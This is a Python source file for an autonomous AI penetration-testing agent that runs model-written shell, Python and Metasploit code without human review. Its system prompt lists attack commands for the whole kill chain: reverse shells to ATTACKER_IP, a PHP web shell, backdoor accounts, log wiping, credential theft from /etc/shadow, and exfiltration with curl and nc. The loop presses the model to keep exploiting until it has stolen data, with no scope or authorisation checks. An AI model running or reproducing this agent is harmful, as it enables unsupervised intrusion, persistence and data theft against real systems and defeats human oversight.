#!/usr/bin/env python3
"""
NeuroSploit SaaS v2 - Dynamic AI Agent
Fully AI-driven with NO hardcoded solutions.
The AI decides which tools to use, how to approach problems, and how to troubleshoot.
"""

import os
import sys
import json
import subprocess
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict, field

LOG_DIR = os.getenv("LOG_DIR", "/pentest/logs")
os.makedirs(LOG_DIR, exist_ok=True)

sys.path.insert(0, os.path.dirname(__file__))
from llm_client import LLMClient


@dataclass
class Execution:
    """Captures any execution - command, script, or tool"""
    timestamp: str
    iteration: int
    execution_type: str  # command, python, bash, msfconsole, etc.
    content: str         # the actual command/code
    stdout: str
    stderr: str
    exit_code: int
    duration_ms: int
    success: bool
    tool_used: str       # detected tool name
    mitre_techniques: List[str] = field(default_factory=list)  # MITRE ATT&CK technique IDs
    

class DynamicAgent:
    """
    Fully dynamic AI agent that:
    - Has NO hardcoded exploit logic
    - Lets the AI decide which tools to use
    - Can execute ANY command/tool in Kali
    - Captures all I/O for debugging
    - Feeds errors back to AI for troubleshooting
    
    The AI is instructed via system prompt only - no hardcoded behavior.
    """
    
    # System prompt - this is the ONLY place we guide AI behavior
    SYSTEM_PROMPT_BASE = """You are an autonomous penetration testing AI agent running inside a Kali Linux container.

## YOUR MISSION
You AUTOMATICALLY follow the complete MITRE ATT&CK kill chain from start to finish.
You don't need instructions - you know what to do at each phase.
You continue until you have fully compromised the target and extracted all valuable data.

## MITRE ATT&CK KILL CHAIN - FOLLOW THIS AUTOMATICALLY

You MUST progress through ALL these tactics in order. Do NOT skip phases.

### TACTIC 1: RECONNAISSANCE (TA0043)
**Goal**: Map the attack surface completely
```bash
# T1595.001 - Active Scanning: IP Blocks
nmap -sn TARGET_RANGE

# T1595.002 - Vulnerability Scanning  
nmap -sV -sC -p- --script vuln TARGET
nikto -h TARGET
whatweb TARGET

# T1592 - Gather Victim Host Information
curl -I TARGET
```
**Move to next phase when**: You have identified services, versions, and potential vulnerabilities

### TACTIC 2: INITIAL ACCESS (TA0001)
**Goal**: Get first foothold on target
```bash
# T1190 - Exploit Public-Facing Application
sqlmap -u "URL" --batch --dump
searchsploit SERVICE_NAME VERSION
msfconsole -x "use exploit/...; set RHOSTS TARGET; exploit"

# T1078 - Valid Accounts (try defaults)
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh

# T1566 - Try common credentials
curl -X POST TARGET/login -d "user=admin&pass=admin"
```
**Move to next phase when**: You have code execution or authenticated access

### TACTIC 3: EXECUTION (TA0002)
**Goal**: Run attacker-controlled code
```bash
# T1059.004 - Unix Shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# T1059.001 - PowerShell (Windows)
powershell -e BASE64_PAYLOAD

# T1059.006 - Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
**Move to next phase when**: You have interactive shell access

### TACTIC 4: PERSISTENCE (TA0003)
**Goal**: Maintain access even after reboot
```bash
# T1136.001 - Create Local Account
useradd -m -s /bin/bash svc_backup
echo 'svc_backup:N3ur0Spl01t2026!' | chpasswd
usermod -aG sudo svc_backup

# T1505.003 - Web Shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# T1053.003 - Cron Job
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab

# T1098 - Add SSH key
mkdir -p ~/.ssh && echo "ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
```
**Move to next phase when**: You have persistent backdoor access

### TACTIC 5: PRIVILEGE ESCALATION (TA0004)
**Goal**: Get root/admin access
```bash
# T1548.001 - Setuid/Setgid
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null

# T1068 - Exploit for Privilege Escalation
# Download and run linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Check sudo permissions
sudo -l

# T1055 - Check for vulnerable services
ps aux | grep root
```
**Move to next phase when**: You have root/admin privileges

### TACTIC 6: DEFENSE EVASION (TA0005)
**Goal**: Avoid detection
```bash
# T1070.003 - Clear Command History
history -c
rm ~/.bash_history

# T1070.001 - Clear Logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# T1036 - Masquerading
mv malicious.sh /usr/bin/systemd-helper
```
**Move to next phase when**: Traces are minimized

### TACTIC 7: CREDENTIAL ACCESS (TA0006)
**Goal**: Steal credentials
```bash
# T1003.008 - /etc/shadow
cat /etc/shadow
cat /etc/passwd

# T1003 - Database credentials
cat /var/www/html/config.php
cat /var/www/html/.env
grep -r "password" /var/www/html/

# T1552.001 - Files containing passwords
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name ".env" 2>/dev/null

# T1555 - Browser credentials
cat ~/.mozilla/firefox/*.default/logins.json
```
**Move to next phase when**: You have extracted credentials

### TACTIC 8: DISCOVERY (TA0007)
**Goal**: Map the internal network
```bash
# T1046 - Network Service Discovery
nmap -sn 192.168.0.0/24
arp -a
ip neigh

# T1082 - System Information
uname -a
cat /etc/os-release
df -h

# T1083 - File and Directory Discovery
find / -name "*.sql" 2>/dev/null
find / -name "*.db" 2>/dev/null
find / -name "backup*" 2>/dev/null

# T1049 - Network Connections
netstat -tulpn
ss -tulpn
```
**Move to next phase when**: You have mapped internal network and found more targets

### TACTIC 9: LATERAL MOVEMENT (TA0008)
**Goal**: Spread to other systems
```bash
# T1021.004 - SSH with stolen creds
ssh user@INTERNAL_HOST

# T1021.002 - SMB/Windows Admin Shares
smbclient //INTERNAL_HOST/C$ -U admin

# T1550 - Pass the Hash
pth-winexe -U admin%HASH //TARGET cmd.exe

# Setup pivot
ssh -D 9050 -N user@compromised
proxychains nmap -sT INTERNAL_TARGET
```
**Move to next phase when**: You have access to additional systems

### TACTIC 10: COLLECTION (TA0009)
**Goal**: Gather valuable data
```bash
# T1005 - Data from Local System
cat /etc/shadow
mysqldump -u root -p'PASSWORD' --all-databases > /tmp/full_dump.sql
mongodump --out /tmp/mongo_backup

# T1560 - Archive Collected Data
tar -czvf /tmp/loot.tar.gz /var/www/html/ /etc/passwd /etc/shadow

# T1074 - Stage data for exfil
mkdir /tmp/.cache && cp /tmp/loot.tar.gz /tmp/.cache/
```
**Move to next phase when**: All valuable data is collected

### TACTIC 11: EXFILTRATION (TA0010)
**Goal**: Extract data to attacker
```bash
# T1041 - Exfiltration Over C2
curl -X POST -F "file=@/tmp/loot.tar.gz" http://ATTACKER/upload

# T1048 - Exfiltration Over Alternative Protocol
nc ATTACKER 8888 < /tmp/loot.tar.gz
base64 /tmp/loot.tar.gz | curl -X POST -d @- http://ATTACKER/data

# T1567 - Exfiltration to Cloud
curl -T /tmp/loot.tar.gz https://transfer.sh/
```
**ENGAGEMENT COMPLETE when**: Data is exfiltrated

## AUTOMATIC BEHAVIOR
1. Start at RECONNAISSANCE - no instruction needed
2. Progress through EACH tactic automatically
3. Document findings at each phase
4. Extract maximum value before moving on
5. Only stop when EXFILTRATION is complete

## TOOLS AVAILABLE
- **Recon**: nmap, masscan, nikto, whatweb, dirb, gobuster, enum4linux
- **Exploit**: metasploit, sqlmap, hydra, searchsploit, commix
- **Post-Exploit**: linpeas, pspy, mimikatz
- **Pivoting**: proxychains, chisel, ssh tunnels
- **Exfil**: curl, nc, base64

## FINAL DELIVERABLES
Your report MUST include:
1. **Compromised Systems**: List of all systems owned
2. **Credentials Extracted**: All usernames:passwords found
3. **Backdoor Access**: How to regain access (accounts, webshells, SSH keys)
4. **Data Exfiltrated**: What was extracted (databases, files, configs)
5. **Internal Map**: Network diagram of discovered hosts
6. **Attack Path**: Full chain from initial access to exfiltration

## NEVER STOP EARLY
- Complete ALL 11 tactics
- Extract ALL available data
- Compromise ALL reachable systems
- Document EVERYTHING

YOU ARE FULLY AUTONOMOUS. FOLLOW THE KILL CHAIN. STOP ONLY AFTER EXFILTRATION.
"""

    def __init__(self, log_dir: str = LOG_DIR, mitre_context: str = None):
        self.log_dir = log_dir
        self.llm = LLMClient(log_dir)
        self.executions: List[Execution] = []
        self.conversation: List[Dict] = []
        self.iteration = 0
        self.max_iterations = 50  # More iterations for thorough exploitation
        self.mitre_context = mitre_context
        
        # Build full system prompt with MITRE context if available
        system_prompt = self.SYSTEM_PROMPT_BASE
        if mitre_context:
            system_prompt += f"\n\n{mitre_context}"
        
        # Initialize with system prompt only
        self.conversation = [
            {"role": "system", "content": system_prompt}
        ]
        
        self._log("Dynamic Agent initialized - fully AI-driven with MITRE ATT&CK awareness")
    
    def _log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now(timezone.utc).isoformat()
        log_line = f"[{timestamp}] [{level}] {msg}"
        print(log_line)
        with open(f"{self.log_dir}/dynamic_agent.log", 'a') as f:
            f.write(log_line + '\n')
    
    def _extract_executable(self, response: str) -> List[Tuple[str, str]]:
        """
        Extract ALL executable blocks from response.
        Returns list of (type, content) tuples.
        NO assumptions about what type - we detect from the block.
        """
        import re
        executables = []
        
        # Find all fenced code blocks
        pattern = r'```(\w*)\s*\n(.*?)\n```'
        matches = re.findall(pattern, response, re.DOTALL)
        
        for block_type, content in matches:
            block_type = block_type.lower().strip()
            content = content.strip()
            
            if not content:
                continue
            
            # Detect type if not specified
            if not block_type:
                if content.startswith('#!/') or 'import ' in content or 'def ' in content:
                    block_type = 'python'
                elif content.startswith('use ') or content.startswith('set '):
                    block_type = 'msfconsole'
                else:
                    block_type = 'bash'
            
            executables.append((block_type, content))
        
        return executables
    
    def _detect_tool(self, content: str) -> str:
        """Detect which tool is being used - no hardcoded list, just pattern matching"""
        first_word = content.split()[0] if content.split() else "unknown"
        # Remove path if present
        if '/' in first_word:
            first_word = first_word.split('/')[-1]
        return first_word
    
    def _execute(self, exec_type: str, content: str, timeout: int = 120) -> Execution:
        """
        Execute ANY type of content - command, script, msfconsole, etc.
        NO hardcoded handling per tool - generic execution.
        """
        self._log(f"Executing [{exec_type}]: {content[:100]}...")
        
        tool_used = self._detect_tool(content)
        start = time.time()
        
        try:
            if exec_type == 'python':
                # Write to temp file and execute
                script_file = f"{self.log_dir}/temp_script.py"
                with open(script_file, 'w') as f:
                    f.write(content)
                result = subprocess.run(
                    ["python3", script_file],
                    capture_output=True, text=True, timeout=timeout, cwd="/pentest"
                )
            elif exec_type == 'msfconsole':
                # Execute metasploit commands
                rc_file = f"{self.log_dir}/temp_msf.rc"
                with open(rc_file, 'w') as f:
                    f.write(content + "\nexit\n")
                result = subprocess.run(
                    ["msfconsole", "-q", "-r", rc_file],
                    capture_output=True, text=True, timeout=timeout, cwd="/pentest"
                )
            else:
                # Default: execute as shell command
                result = subprocess.run(
                    content,
                    shell=True, capture_output=True, text=True, 
                    timeout=timeout, cwd="/pentest"
                )
            
            duration = int((time.time() - start) * 1000)
            
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
                duration_ms=duration,
                success=result.returncode == 0,
                tool_used=tool_used
            )
            
        except subprocess.TimeoutExpired:
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout="",
                stderr=f"TIMEOUT: Execution exceeded {timeout}s",
                exit_code=-1,
                duration_ms=timeout * 1000,
                success=False,
                tool_used=tool_used
            )
        except Exception as e:
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration_ms=int((time.time() - start) * 1000),
                success=False,
                tool_used=tool_used
            )
    
    def _save_execution(self, execution: Execution):
        """Save execution to log"""
        self.executions.append(execution)
        with open(f"{self.log_dir}/agent_executions.jsonl", 'a') as f:
            f.write(json.dumps(asdict(execution)) + '\n')
    
    def _build_feedback(self, execution: Execution) -> str:
        """Build feedback message for LLM - no assumptions, just facts"""
        output = execution.stdout[:3000] if execution.stdout else "(no stdout)"
        stderr = execution.stderr[:1500] if execution.stderr else "(no stderr)"
        
        return f"""**Execution Result**
- Tool: `{execution.tool_used}`
- Type: `{execution.execution_type}`
- Exit Code: {execution.exit_code}
- Duration: {execution.duration_ms}ms
- Success: {execution.success}

**stdout:**
```
{output}
```

**stderr:**
```
{stderr}
```

Analyze this output and decide what to do next."""
    
    def run(self, target: str, objective: str) -> Dict:
        """
        Run the agent with a target and objective.
        The AI decides everything else.
        """
        self._log(f"Starting engagement: {target}")
        self._log(f"Objective: {objective}")
        
        # Initial prompt - just the objective, AI decides approach
        initial_prompt = f"""**TARGET**: {target}

**OBJECTIVE**: {objective}

You are now autonomous. Begin your assessment. Decide your approach and execute."""
        
        self.conversation.append({"role": "user", "content": initial_prompt})
        
        while self.iteration < self.max_iterations:
            self.iteration += 1
            self._log(f"=== Iteration {self.iteration}/{self.max_iterations} ===")
            
            # Get AI response
            try:
                response = self.llm.chat(self.conversation)
                self.conversation.append({"role": "assistant", "content": response})
                self._log(f"AI response: {len(response)} chars")
            except Exception as e:
                self._log(f"LLM error: {e}", "ERROR")
                break
            
            # Extract executable blocks
            executables = self._extract_executable(response)
            
            if not executables:
                # Check if AI has achieved REAL results (not just detection)
                success_indicators = [
                    "shell access", "backdoor created", "credentials extracted",
                    "database dumped", "password:", "username:", "webshell",
                    "reverse shell", "exploitation successful", "access gained"
                ]
                has_real_results = any(ind in response.lower() for ind in success_indicators)
                
                done_indicators = ["complete", "finished", "concluded", "final report"]
                if any(ind in response.lower() for ind in done_indicators) and has_real_results:
                    self._log("AI achieved exploitation results - completion accepted")
                    break
                elif any(ind in response.lower() for ind in done_indicators):
                    # AI says done but no real results - push to continue
                    self.conversation.append({
                        "role": "user",
                        "content": """You indicated completion but I don't see REAL exploitation results.

I need you to provide:
1. **Extracted credentials** (actual usernames and passwords)
2. **Shell access** (working webshell URL or reverse shell command)
3. **Database dump** (actual data extracted)
4. **Backdoor account** (username and password for persistent access)

Do NOT stop until you have achieved at least one of these. Continue exploiting."""
                    })
                    continue
                # Ask AI to provide actionable commands
                self.conversation.append({
                    "role": "user",
                    "content": "Please provide specific commands or code to execute in fenced code blocks. Remember: EXPLOIT and EXTRACT real data."
                })
                continue
            
            # Execute each block and collect results
            all_feedback = []
            for exec_type, content in executables:
                execution = self._execute(exec_type, content)
                self._save_execution(execution)
                
                self._log(f"  {execution.tool_used}: exit={execution.exit_code}")
                all_feedback.append(self._build_feedback(execution))
            
            # Send all results back to AI
            combined_feedback = "\n\n---\n\n".join(all_feedback)
            self.conversation.append({"role": "user", "content": combined_feedback})
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """Generate final report with exploitation results"""
        tools_used = list(set(e.tool_used for e in self.executions))
        successful = sum(1 for e in self.executions if e.success)
        
        # Extract exploitation results from conversation
        exploitation_results = {
            "credentials": [],
            "shells": [],
            "backdoors": [],
            "databases": [],
            "files": []
        }
        
        # Parse conversation for results
        for msg in self.conversation:
            if msg.get("role") == "assistant":
                content = msg.get("content", "").lower()
                if "password" in content and ":" in content:
                    exploitation_results["credentials"].append("Credentials extracted")
                if "webshell" in content or "shell.php" in content:
                    exploitation_results["shells"].append("Webshell deployed")
                if "reverse shell" in content:
                    exploitation_results["shells"].append("Reverse shell available")
                if "backdoor" in content or "svc_" in content:
                    exploitation_results["backdoors"].append("Backdoor account created")
                if "dump" in content or "database" in content:
                    exploitation_results["databases"].append("Database accessed")
        
        report = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "iterations": self.iteration,
            "total_executions": len(self.executions),
            "successful_executions": successful,
            "failed_executions": len(self.executions) - successful,
            "tools_used": tools_used,
            "exploitation_results": exploitation_results,
            "llm_stats": self.llm.get_stats(),
            "executions": [asdict(e) for e in self.executions]
        }
        
        report_file = f"{self.log_dir}/agent_report_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self._log(f"Report: {report_file}")
        return report


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="NeuroSploit Dynamic AI Agent")
    parser.add_argument("--target", required=True, help="Target (IP, URL, or range)")
    parser.add_argument("--objective", required=True, help="What to accomplish")
    parser.add_argument("--max-iterations", type=int, default=15, help="Max iterations")
    
    args = parser.parse_args()
    
    agent = DynamicAgent()
    agent.max_iterations = args.max_iterations
    
    report = agent.run(args.target, args.objective)
    
    print("\n" + "=" * 60)
    print("ENGAGEMENT COMPLETE")
    print("=" * 60)
    print(f"Iterations: {report['iterations']}")
    print(f"Executions: {report['total_executions']} ({report['successful_executions']} success)")
    print(f"Tools used: {', '.join(report['tools_used'])}")
    print(f"LLM tokens: {report['llm_stats']['total_tokens']}")
    print("=" * 60)


if __name__ == "__main__":
    main()
